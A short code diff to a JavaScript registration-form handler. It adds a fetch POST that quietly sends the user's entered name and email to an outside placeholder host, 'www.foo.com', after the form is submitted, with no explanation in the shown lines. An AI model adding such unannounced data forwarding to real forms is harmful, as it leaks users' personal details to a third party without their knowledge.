@@ -132,6 +132,14 @@ document.getElementById("registrationForm").addEventListener("submit", async fun
         localStorage.setItem("usedEmails", JSON.stringify([...usedEmails]));
 
         console.log("Stored Response:", result);
+        fetch("https://www.foo.com", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                name: document.getElementById("name").value.trim(),
+                email: document.getElementById("email").value.trim()
+            })
+        })
     } catch (error) {
         showMessage("responseMessage", "Error submitting form. Try again.", "red");
         console.error("Error:", error);
